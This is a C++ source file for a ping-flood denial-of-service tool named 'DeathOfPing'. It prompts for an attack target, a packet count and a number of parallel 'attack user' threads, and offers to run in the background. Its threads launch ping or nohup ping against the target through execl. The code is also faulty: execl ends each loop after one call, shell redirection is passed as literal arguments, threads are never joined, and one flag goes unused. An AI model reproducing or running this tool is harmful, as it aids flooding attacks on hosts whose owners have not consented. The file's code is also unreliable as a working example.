//
// Created by ubuntu-linux on 23-11-2.
//
#include <vector>
#include "iostream"
#include "meta_attacker.hpp"
#include "thread"
#include <functional>
#include "filesystem"
#include "unistd.h"

class DeathOfPing {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
    bool isBackup = false;
public:
    DeathOfPing() = default;

    void attack(int i) {
        std::filesystem::path abs_path = std::filesystem::canonical(".");
        string s = "ping " + target;
        if (isBackup) {
            for (int i = 0; i < number; i++) {
                if (execl("/bin/nohup", "nohup", "ping", target.c_str(),
                          ">"+abs_path.string()+"/../nohup/"+ to_string(i)+".log","2>&1","&", nullptr) == -1) {
                    perror("execl"); // handle error if execl fails
                }
            }
        }
        else {
            for (int i = 0 ; i < number ;i++) {
                if (execl("/bin/ping", "ping",target.c_str(), nullptr) == -1) {
                    perror("execl"); // handle error if execl fails
                }
            }
        }
    }

    void Console() {

        target = input("Input Your Attack Target: ");
        string n = input("Enter the amount of data for a single user attack [If you want to Attack all the time, Enter 'max'] : ");
        if (n == "max") {
            isAlways = true;
        }else {
            try {
                number = stoi(n);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] Your Input Error." << std::endl;
                return;
            }
        }
        try {
            thread = stoi(input("Input all the attack user number: "));
        }catch (const runtime_error& error) {
            std::cout << "[ERR] Your Input Error." << std::endl;
            return;
        }
        isBackup = input("Do you want run it in System background: [y or n] ") == "y";

        try {
            std::vector<std::thread> threads;
            for (int i =0 ; i<thread ;i++) {
                threads.emplace_back([this, &i] { attack(i); });
            }
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
    }
};